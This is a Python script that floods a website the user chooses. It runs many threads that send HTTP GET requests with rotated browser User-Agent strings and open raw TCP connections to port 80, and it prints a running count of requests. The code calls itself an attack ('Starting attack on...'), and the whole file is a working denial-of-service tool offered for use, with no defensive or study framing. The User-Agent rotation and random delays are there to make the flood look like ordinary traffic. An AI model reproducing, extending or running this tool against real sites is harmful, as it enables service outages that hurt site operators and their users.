import socket
import threading
import random
import time
import requests

# Get website URL and number of threads from user input
url = input("Enter your website URL (e.g., https://example.com/): ")
threads = int(input("Enter number of threads: "))

# List of User-Agent strings to simulate various browsers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
]

# Configure global variables for monitoring and rate-limiting
running = True
request_count = 0

# Function to send HTTP GET request using requests
def send_http_request():
    global request_count
    while running:
        try:
            # Randomize headers to simulate different browsers
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(url, headers=headers)

            # Increase request count and log the request
            request_count += 1
            print(f"Sent HTTP request to {url} - Status Code: {response.status_code} - Total Requests: {request_count}")

            # Randomized delay between 0.1 and 2 seconds to simulate a more realistic traffic pattern
            time.sleep(random.uniform(0.1, 2))

        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

# Function to send raw TCP packets using socket (without HTTP layer)
def send_tcp_packet():
    global request_count
    while running:
        try:
            # Create a new socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((socket.gethostbyname(url.split('/')[2]), 80))  # Connect to port 80 (HTTP)

            # Send raw HTTP GET request
            request = f"GET / HTTP/1.1\r\nHost: {url.split('/')[2]}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())

            # Increase request count and log the request
            request_count += 1
            print(f"Sent raw TCP packet to {url} - Total Requests: {request_count}")

            # Close the socket
            s.close()

            # Randomized delay between 0.1 and 2 seconds to simulate a more realistic traffic pattern
            time.sleep(random.uniform(0.1, 2))

        except socket.error as e:
            print(f"Socket Error occurred: {e}")

# Monitor thread that prints stats every second
def monitor():
    while running:
        time.sleep(1)
        print(f"[+] Total Requests Sent: {request_count} requests in the last second")

# Start the attack with the specified number of threads
def start_attack():
    print(f"Starting attack on {url} with {threads} threads...\n")

    # Create and start threads to simulate concurrent HTTP requests
    for _ in range(threads):
        t_http = threading.Thread(target=send_http_request)
        t_http.daemon = True
        t_http.start()

        t_tcp = threading.Thread(target=send_tcp_packet)
        t_tcp.daemon = True
        t_tcp.start()

    # Start the monitoring thread
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.daemon = True
    monitor_thread.start()

    # Keep the program running
    while running:
        time.sleep(1)

# Stop the attack gracefully when interrupted
try:
    start_attack()
except KeyboardInterrupt:
    running = False
    print("\n[!] Attack stopped.")
